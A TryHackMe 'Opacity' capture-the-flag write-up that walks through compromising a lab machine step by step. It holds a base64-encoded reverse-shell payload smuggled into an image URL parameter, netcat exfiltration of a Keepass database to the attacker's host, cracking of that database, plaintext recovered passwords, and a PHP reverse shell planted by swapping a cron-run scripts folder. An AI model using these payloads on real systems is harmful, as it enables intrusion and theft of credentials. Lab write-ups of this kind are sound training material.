---
title: Opacity
description: 'RCE through command injection, cracking a Keepass database and exploiting permissions on a script'
pubDate: 2023-06-14
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/328c078f7c5695439a46ba90ae48aaa0.png'
---

After running Feroxbuster we find `/cloud/`:

```bash
feroxbuster -u http://10.10.254.116
...[snip]...
[####################] - 40s    30000/30000   742/s   http://10.10.254.116/cloud/
...[snip]...
```

## USER

We can inject in the `url` param that is used to post images:

```
POST /cloud/ HTTP/1.1
Host: 10.10.254.116
...[snip]...
url=`echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC44LjExOS4xMzcvNDQ0NCAwPiYx|base64+-d|bash`ncl;x.jpg
```
Now we got a shell on the box.

In the `/var/www/html/login.php` we find some credentials:

```php
...[snip]...
$logins = array('admin' => 'oncloud9','root' => 'oncloud9','administrator' => 'oncloud9');
...[snip]...
```

## USER

In the `/opt`/ folder there is a Keepass database (`dataset.kdbx`), lets download it:

On our machine:
```bash
nc -l -p 1234 > dataset.kdbx
```

On the remote:
```bash
nc -w 3 10.8.119.137 1234 < dataset.kdbx
```

### Cracking Keepass

We need to crack the password for the Keepass database:
```bash
keepass2john dataset.kdbx > dataset.hash
john --wordlist=/usr/share/wordlists/rockyou.txt dataset.hash
...[snip]...
741852963        (dataset)
...[snip]...
```

Opening the database with `kpcli`:
```bash
kpcli:/>open dataset.kdbx
kpcli:/>ls
=== Groups ===
Root/
kpcli:/>cd Root/
kpcli:/Root>ls
=== Entries ===
0. user:password
kpcli:/Root> show -a -f 0
Title: user:password
Uname: sysadmin
 Pass: Cl0udP4ss40p4city#8700
...[snip]...
```

This password can be used to SSH as user `sysadmin`.

## ROOT

The `scripts` folder is not writable, but since its inside the `sysadmin` group we can move it.
So create a new folder (`scripts_/`) with a `scripts.php` file containing a reverse shell.
The moving the original `scripts/` folder to `scripts_bak` and moving our scripts folder (`scripts_/`) to the old scripts folder location.

```bash
mv scripts scripts_bak && mv scripts_ scripts
```

Now after about a minute the scripts gets executed and we get a shell as root.

